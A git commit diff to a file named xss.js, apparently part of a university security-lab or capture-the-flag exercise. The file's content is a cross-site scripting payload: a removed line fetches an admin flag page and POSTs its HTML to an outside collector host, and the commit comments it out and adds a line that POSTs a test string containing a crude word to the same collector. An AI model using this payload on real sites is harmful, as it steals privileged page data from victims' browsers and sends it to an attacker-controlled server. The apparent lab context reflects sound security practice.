19ba6b1ebe9bb2caf8f70ad68dc433f8ef0cc729
qqqvaqushka <108834751+qqqvaqushka@users.noreply.github.com>
2024-10-11 16:30:11 +0300

    xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,3 @@
 alert("!")
-fetch("http://corporate.tasks.prak.seclab.cs.msu.ru/admin/flag").then(function(resp){return (resp.text())}).then(function(html){ fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data="+html }) })
+//fetch("http://corporate.tasks.prak.seclab.cs.msu.ru/admin/flag").then(function(resp){return (resp.text())}).then(function(html){ fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data="+html }) })
+fetch("https://dalexey.pythonanywhere.com/capture",{ method: "POST", body : "data=hui" })
